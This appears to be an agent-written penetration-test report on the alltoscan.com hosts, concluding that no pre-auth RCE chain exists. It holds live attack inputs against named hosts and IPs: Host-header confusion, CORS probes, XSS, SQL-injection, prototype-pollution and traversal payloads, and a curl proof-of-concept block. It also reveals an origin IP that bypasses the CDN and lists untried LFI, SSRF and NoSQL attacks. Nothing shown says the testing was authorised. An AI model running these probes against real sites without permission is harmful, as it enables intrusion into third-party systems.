# Alltoscan Chainer Round 2 — 4-Pivot Pre-Auth RCE Negative (2026-08-16)

Proven **DEFINITIVE NONE** via 13-point handoff map + live evidence. Template for any Nuxt 3 + nginx/1.22.1 + Plesk PHP 8.2 ecosystem claiming pre-auth RCE.

## Handoff Map (Source → Sink)

| # | Handoff | Tested Vectors | Verdict | Evidence Signal |
|---|---|---|---|---|
| H-1 | nginx Host confusion scan(188) → ats PHP(142) | `Host: ats`, `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL`, `curl --resolve ats:443:188 /api/`, IP+Host 188/142, HTTP:80 301 | **BLOCKED** — falls to `alltoscan.com` static `200 c05 3077B` HTML, never proxies | `scan/api Host:ats → text/html c05` vs correct `ats:443:142 → jsonrpc 370B` |
| H-2 | Host confusion → main _payload.json | `Host: scan → alltoscan/_payload.json` | Working correctly (isolation works) | `69B [{\"data\":1...]` vs reverse returns c05 |
| H-3 | CORS reflect → cache poison | `Origin: evil.com`, `Origin: null`, `OPTIONS` preflight, 2-step buster `cacheBuster=timestamp`, `X-Forwarded-Host evil` | **LOW only** — reflects `ACAO: evil.com/null` + `Vary: Origin`, no `ACAC`, `Cache-Control: no-cache`, `s-maxage` absent | `access-control-allow-origin: https://evil.com` + `Vary: Origin` |
| H-4 | HTML fallback 200 → stored XSS via path/q | `/evil-test-path-12345` (main 200 c05 vs scan 404 Nuxt 15484), `Host: evil.com → 200 c05`, `?q=<svg>/{{7*7}}/\"><script>` on `/?q=`, `/api?q=`, `/address/bsc/<payload>` | **BLOCKED** — zero reflection, body lengths stable 35944/4137/2966 | `grep -c "<svg" → 0` |
| H-5 | ATS PHP jsonrpc → code exec | `GET /api/`, `POST getTokenInfo/eth_getBalance/listMethods/admin_peers`, `method=__proto__/constructor/eval/phpinfo/system` + `{{7*7}}` params, SQLi `admin' OR 1=1` JSON `{"$gt":""}` | **BLOCKED** — stub returns same `{"symbol":"ATS","circulatingSupply":"73833419..."}` 370B for any method | All 6 `POST method=* → 370B` identical; login → `banned.php` 101B |
| H-6 | Client-RPC poison search → eth_getTransaction → DOM XSS | JS bundle audit 9 chunks 744KB (`C_X1aWDQ.js` 205K + `evWO-ChZ.js` 14K + `CS0uC0Ga.js` tx page + `Be7mfUwV.js` 435K) grep `innerHTML/v-html/fetch/publicnode/ApiBase` | **BLOCKED** — only `router.push(/address|/tx)` + `shortener()` text node; `innerHTML` only hardcoded `cdn.bmcdn5.com` ad; publicnode 9 RPCs hardcoded `ethereum-rpc.publicnode.com` etc. client-direct | `r=[{server:"https://ethereum-rpc.publicnode.com",chain:"eth"}...]` 9 entries |
| H-7 | Mail Plesk pivot | `mail/login.php` 303→:443, `mail:8443`, `/.env/.git/HEAD/config.php/phpinfo/backup.zip` on all hosts | **BLOCKED** — 8443 closed, leaks 403/404, WAF bans | `/.env 403` `/backup.zip 404` `.git/HEAD 404` |
| H-8 | Iconify SSRF `/api/_nuxt_icon` → iconify.design | `GET /api/_nuxt_icon/<icon>.json`, traversal `evil:..`, `/collections` | Not exposed `404 {"succeeded":false}` | `fallbackToApi:true` but client-direct not server proxy |
| H-9 | Alias traversal | `/api/../`, `/api/%2e%2e/`, `//api/get_home_data`, `/_nuxt/../api` on scan+ats | **BLOCKED** — `400/404 JSON script-src 'none'` or normalized 200 JSON | `/%2e%2e/ → 404` `%00→400` |
| H-10 | Web cache deception | `/api/get_home_data/.css/.png/%0a.png` | 404 JSON not cached | — |
| H-11 | SNI ATS on 188 vs 142 | `curl --resolve ats:443:188 vs 142 /api/` | Proves vhost separation (188=no PHP) | See H-1 |
| H-12 | Chain-specific address SSR | `GET /address/:chain/:address` validation via `$fetch(ApiBase+/get_address POST {chain,address})` | `404 Address not found` for invalid, no injection | `CS0uC0Ga.js` POST body not query |
| H-13 | watswallet shared infra | `watswallet.com → CF 104.21.41.51` vs `alltoscan 188` vs `ats 142` | Isolated, no shared cookie/session | DNS split |

**Helmet hardening signal:** scan JSON `CSP default-src 'self'; HSTS max-age=15552000; X-Frame SAMEORIGIN; ratelimit 10;w=5 → 429` intact; apex has NONE (DO origin exposed `188.166.44.153` bypassing CF `carol/norman.ns`).

## Why Each Pivot Blocked (Chain Break)

1. **Nginx confusion:** nginx `server_name` strict. `SNI` decides vhost, `Host` mismatch falls to default static `c05`, not proxy_pass to `142.93.239.31`. Need `proxy_pass https://ats` + missing `server_name` to exploit.
2. **CORS+cache:** `Vary: Origin` + `Cache-Control: no-cache` prevents poison; no `ACAC`; data public.
3. **PHP pivot:** method param dead code; handler is `echo json_encode(tokenInfo)` regardless. No `call_user_func`, no dispatch.
4. **Client-RPC:** publicnode is client `new ae(server).eth.getTransaction(hash)` only for routing, not HTML templating. No `v-html` on `result.input`.

## Blind Spots for Definitive NONE Report

- Auth Plesk `:8443` not reachable externally → authenticated file-upload → RCE needs creds (beyond pre-auth).
- Hidden `proxy.php?element=api2` on `142.93.239.31` (`<meta refresh → /security/pages/proxy.php?element=api2` with `PHP/8.1.34`) not fuzzed for `?element=../../../etc/passwd` LFI / `?url=` SSRF.
- POST `{"chain":{"$where":"..."}}` NoSQL`$lookup/$where` not fully exhausted (only GET query tested beyond round2 10 vectors).
- Alt ports 3000-9000 Node debug (9229) not fully scanned this round.

## Re-Test Triggers (when chain becomes viable)

- `curl -H Host:ats scan/api/` ever returns `application/json circulatingSupply` not `c05 HTML`.
- `scan/api` ever returns `Cache-Control: public` or `ACAC: true`.
- `address` page HTML ever contains literal input substring (`<svg` echo).
- `ats/api` ever echoes `method` param verbatim.

## POC Re-Run (7 lines)

```bash
UA="Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
curl -sk -i -A "$UA" -H "Host: ats.alltoscan.com" https://scan.alltoscan.com/api/get_home_data | head -n 5 # → c05 HTML
curl -sk -i -A "$UA" --resolve ats.alltoscan.com:443:188.166.44.153 https://ats.alltoscan.com/api/ | head -n 5 # → c05 (proves isolation)
curl -sk -i -A "$UA" -H "Origin: https://evil.com" https://scan.alltoscan.com/api/get_home_data | grep -i access-control
curl -sk -A "$UA" -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","id":1,"method":"__proto__","params":["{{7*7}}"]}' https://ats.alltoscan.com/api/ | grep circulatingSupply
curl -sk -i -A "$UA" -X POST -d "username=admin' OR '1'='1&password=x" https://ats.alltoscan.com/app/login.php | grep banned
curl -sk -A "$UA" "https://scan.alltoscan.com/?q=%3Csvg%20onload%3Dalert(1)%3E" | grep -c "<svg" # → 0
grep -o "publicnode.com" /tmp/scan_chunks/_evWO-ChZ.js | wc -l # → 9
```

## Artifacts

`/tmp/r2_chainer.py → /tmp/r2_chainer_out.txt` (80KB), `/tmp/r2_final_probe.py → /tmp/r2_final_out.txt`, `/tmp/scan_chunks/*` 744KB, `/tmp/scan_entry.js`, `/root/r2_evidence/`, `/root/AGENT4_CHAINER_ROUND2_ALLTOSCAN_REPORT.md`
